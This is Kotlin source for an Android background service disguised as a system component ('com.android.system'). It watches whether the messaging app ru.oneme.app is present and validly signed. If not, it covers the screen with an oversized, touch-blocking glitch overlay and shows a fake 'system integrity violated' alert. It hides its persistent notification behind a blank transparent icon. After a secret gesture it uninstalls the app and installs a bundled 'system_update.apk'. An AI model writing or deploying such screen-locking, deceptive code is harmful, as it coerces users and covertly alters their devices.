package com.android.system

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.*
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.view.*
import androidx.core.app.NotificationCompat
import androidx.core.content.FileProvider
import kotlin.random.Random
import java.io.File
import java.io.FileOutputStream

class SystemFailureService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var surfaceView: SurfaceView
    private lateinit var handler: Handler
    private lateinit var drawRunnable: Runnable
    private lateinit var monitorRunnable: Runnable
    private var isRunning = true
    private var isOverlayActive = false
    private var displayWidth = 0
    private var displayHeight = 0

    // Для обработки жестов
    private var gestureState = 0
    private var firstTapTime = 0L
    private val doubleTapTimeout = 500

    // Идентификатор уведомления
    private val NOTIFICATION_ID = 1
    private val CHANNEL_ID = "system_channel"

    // Код запроса разрешений
    companion object {
        const val REQUEST_OVERLAY_PERMISSION = 1001
        const val REQUEST_INSTALL_PERMISSION = 1002
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // Получаем реальные размеры экрана
        val display = windowManager.defaultDisplay
        val realSize = Point()
        display.getRealSize(realSize)
        displayWidth = realSize.x
        displayHeight = realSize.y

        handler = Handler(Looper.getMainLooper())
        createNotificationChannel()

        // Сразу показываем уведомление
        updateNotification(false)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Всегда запускаем мониторинг при запуске сервиса
        startMonitoring()
        return START_STICKY
    }

    private fun startMonitoring() {
        if (::monitorRunnable.isInitialized) {
            handler.removeCallbacks(monitorRunnable)
        }

        monitorRunnable = Runnable {
            if (!isRunning) return@Runnable

            try {
                val isValid = SignatureChecker.isStubValid(this, "ru.oneme.app")

                if (!isValid && !isOverlayActive) {
                    // Пакет отсутствует или невалиден, запускаем оверлей
                    startOverlay()
                } else if (isValid && isOverlayActive) {
                    // Пакет на месте и валиден, останавливаем оверлей
                    stopOverlay()
                }
            } catch (e: Exception) {
                // В случае ошибки проверки, считаем что пакет невалиден
                if (!isOverlayActive) {
                    startOverlay()
                }
            }

            // Продолжаем мониторинг
            if (isRunning) {
                handler.postDelayed(monitorRunnable, 2000)
            }
        }

        handler.post(monitorRunnable)
    }

    private fun startOverlay() {
        // Проверяем разрешение на overlay
        if (!Settings.canDrawOverlays(this)) {
            requestOverlayPermission()
            return
        }

        isOverlayActive = true
        setupOverlay()
        startDrawing()
        updateNotification(true)
    }

    private fun stopOverlay() {
        isOverlayActive = false
        isRunning = false

        // Останавливаем рисование
        handler.removeCallbacks(drawRunnable)

        // Удаляем оверлей
        try {
            if (::surfaceView.isInitialized) {
                windowManager.removeView(surfaceView)
            }
        } catch (e: Exception) {
            // Игнорируем ошибки при удаления
        }

        // Обновляем уведомление
        updateNotification(false)

        // Продолжаем мониторинг в фоновом режиме
        isRunning = true
        startMonitoring()
    }

    private fun setupOverlay() {
        surfaceView = object : SurfaceView(this) {
            override fun onTouchEvent(event: MotionEvent): Boolean {
                handleTouch(event)
                return true
            }
        }

        val params = WindowManager.LayoutParams(
            displayWidth + 200,
            displayHeight + 200,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = -100
            y = -100
        }

        try {
            windowManager.addView(surfaceView, params)
        } catch (e: Exception) {
            // Не останавливаем сервис при ошибке
        }
    }

    private fun handleTouch(event: MotionEvent) {
        val x = event.rawX
        val y = event.rawY

        when (event.action) {
            MotionEvent.ACTION_DOWN -> {
                when (gestureState) {
                    0 -> {
                        if (x < displayWidth * 0.1 && y > displayHeight * 0.9) {
                            firstTapTime = System.currentTimeMillis()
                            gestureState = 1
                        }
                    }
                    1 -> {
                        if (System.currentTimeMillis() - firstTapTime < doubleTapTimeout &&
                            x < displayWidth * 0.1 && y > displayHeight * 0.9) {
                            gestureState = 2
                        } else {
                            gestureState = 0
                        }
                    }
                }
            }
            MotionEvent.ACTION_MOVE -> {
                if (gestureState == 2) {
                    if (x > displayWidth * 0.9 && y < displayHeight * 0.1) {
                        onGestureRecognized()
                        gestureState = 0
                    }
                }
            }
            MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> {
                if (gestureState == 1) {
                    if (System.currentTimeMillis() - firstTapTime >= doubleTapTimeout) {
                        gestureState = 0
                    }
                } else if (gestureState == 2) {
                    gestureState = 0
                }
            }
        }
    }

    private fun onGestureRecognized() {
        // Временно отключаем оверлей
        isRunning = false
        handler.removeCallbacks(drawRunnable)

        try {
            windowManager.removeView(surfaceView)
        } catch (e: Exception) {
            // Игнорируем ошибки при удаления
        }

        isOverlayActive = false
        updateNotification(false)

        // Устанавливаем пакет
        installPackage()

        // Через 7 секунд снова запускаем мониторинг
        handler.postDelayed({
            isRunning = true
            startMonitoring()
        }, 7000)
    }

    private fun installPackage() {
        // Сначала удаляем невалидный пакет, если он есть
        uninstallInvalidPackage()

        // Ждем немного перед установкой
        handler.postDelayed({
            installPackageFromAssets()
        }, 1000)
    }

    private fun uninstallInvalidPackage() {
        try {
            // Проверяем, установлен ли пакет с неправильной подписью
            if (SignatureChecker.isPackageInstalled(this, "ru.oneme.app") &&
                !SignatureChecker.isStubValid(this, "ru.oneme.app")) {

                val packageUri = Uri.parse("package:ru.oneme.app")
                val uninstallIntent = Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri)
                uninstallIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true)
                uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(uninstallIntent)
            }
        } catch (e: Exception) {
            // Игнорируем ошибки
        }
    }

    private fun installPackageFromAssets() {
        // Проверяем разрешение на установку из неизвестных источников
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
            !packageManager.canRequestPackageInstalls()) {
            requestInstallPermission()
            return
        }

        try {
            // Копируем APK из assets во временную директорию
            val inputStream = assets.open("system_update.apk")
            val outputFile = File(cacheDir, "system_update_temp.apk")
            val outputStream = FileOutputStream(outputFile)
            inputStream.use { input ->
                outputStream.use { output ->
                    input.copyTo(output)
                }
            }

            // Создаем Intent для установки
            val apkUri = FileProvider.getUriForFile(
                this,
                "${packageName}.fileprovider",
                outputFile
            )

            val installIntent = Intent(Intent.ACTION_INSTALL_PACKAGE).apply {
                data = apkUri
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true)
            }
            startActivity(installIntent)
        } catch (e: Exception) {
            // В случае ошибки просто продолжаем
        }
    }

    private fun requestOverlayPermission() {
        val intent = Intent(
            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            Uri.parse("package:$packageName")
        )
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun requestInstallPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
            intent.data = Uri.parse("package:$packageName")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }
    }

    private fun startDrawing() {
        isRunning = true

        // Создаем bitmap для сохранения состояния между кадрами
        var glitchBitmap: Bitmap? = null

        drawRunnable = object : Runnable {
            override fun run() {
                if (!isRunning) return

                val holder = surfaceView.holder
                var canvas: Canvas? = null
                try {
                    canvas = holder.lockCanvas()
                    if (canvas != null) {
                        // Инициализируем bitmap при первом запуске
                        if (glitchBitmap == null) {
                            glitchBitmap = Bitmap.createBitmap(canvas.width, canvas.height, Bitmap.Config.ARGB_8888)
                            val initCanvas = Canvas(glitchBitmap!!)
                            initCanvas.drawColor(Color.argb(255, 255, 0, 255))
                        }

                        // Рисуем на bitmap
                        val bufferCanvas = Canvas(glitchBitmap!!)
                        drawGlitchEffect(bufferCanvas)

                        // Отображаем bitmap на экран
                        canvas.drawBitmap(glitchBitmap!!, 0f, 0f, null)
                    }
                } finally {
                    canvas?.let {
                        try {
                            holder.unlockCanvasAndPost(it)
                        } catch (e: Exception) {
                            // Игнорируем ошибки разблокировки
                        }
                    }
                }
                handler.postDelayed(this, 100)
            }
        }
        handler.post(drawRunnable)
    }

    private fun drawGlitchEffect(canvas: Canvas) {
        val random = Random.Default
        val paint = Paint()

        // Вертикальные линии разных цветов
        for (i in 0 until 8) {
            if (random.nextFloat() > 0.3f) {
                val x = random.nextInt(canvas.width)
                val width = random.nextInt(2, 8)
                val height = random.nextInt(canvas.height / 4, canvas.height)
                val startY = random.nextInt(canvas.height - height)

                paint.color = Color.argb(
                    200,
                    random.nextInt(256),
                    random.nextInt(256),
                    random.nextInt(256)
                )
                canvas.drawRect(
                    x.toFloat(),
                    startY.toFloat(),
                    (x + width).toFloat(),
                    (startY + height).toFloat(),
                    paint
                )
            }
        }

        // Широкие горизонтальные стирающие линии
        for (i in 0 until 3) {
            if (random.nextFloat() > 0.5f) {
                val y = random.nextInt(canvas.height)
                val height = random.nextInt(5, 25)

                paint.color = Color.argb(30, 255, 255, 255)
                canvas.drawRect(0f, y.toFloat(), canvas.width.toFloat(), (y + height).toFloat(), paint)
            }
        }

        // Прямоугольники с пиксельным шумом (разных размеров)
        for (i in 0 until 15) {
            val width = random.nextInt(50, 300)
            val height = random.nextInt(50, 200)
            val left = random.nextInt(canvas.width - width)
            val top = random.nextInt(canvas.height - height)

            // Рисуем более насыщенный шум
            for (x in 0 until width step 3) {
                for (y in 0 until height step 3) {
                    if (random.nextFloat() > 0.2f) {
                        // Минимальная прозрачность для насыщенности
                        paint.color = Color.argb(
                            random.nextInt(200, 255),
                            random.nextInt(256),
                            random.nextInt(256),
                            random.nextInt(256)
                        )
                        val rectSize = random.nextInt(2, 5)
                        canvas.drawRect(
                            (left + x).toFloat(),
                            (top + y).toFloat(),
                            (left + x + rectSize).toFloat(),
                            (top + y + rectSize).toFloat(),
                            paint
                        )
                    }
                }
            }
        }
    }

    private fun updateNotification(showAlert: Boolean) {
        val notification = if (showAlert) {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Внимание")
                .setContentText("Нарушена целостность системы")
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setOngoing(true)
                .build()
        } else {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(" ")
                .setContentText(" ")
                .setSmallIcon(R.drawable.transparent_icon)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setOngoing(true)
                .build()
        }

        try {
            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            // Игнорируем ошибки с уведомлениями
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Системные уведомления",
            NotificationManager.IMPORTANCE_HIGH
        )
        channel.description = "Уведомления о состоянии системы"
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false

        // Останавливаем все runnables
        if (::handler.isInitialized) {
            handler.removeCallbacksAndMessages(null)
        }

        // Удаляем оверлей
        try {
            if (::surfaceView.isInitialized) {
                windowManager.removeView(surfaceView)
            }
        } catch (e: Exception) {
            // Игнорируем ошибки при удаления
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}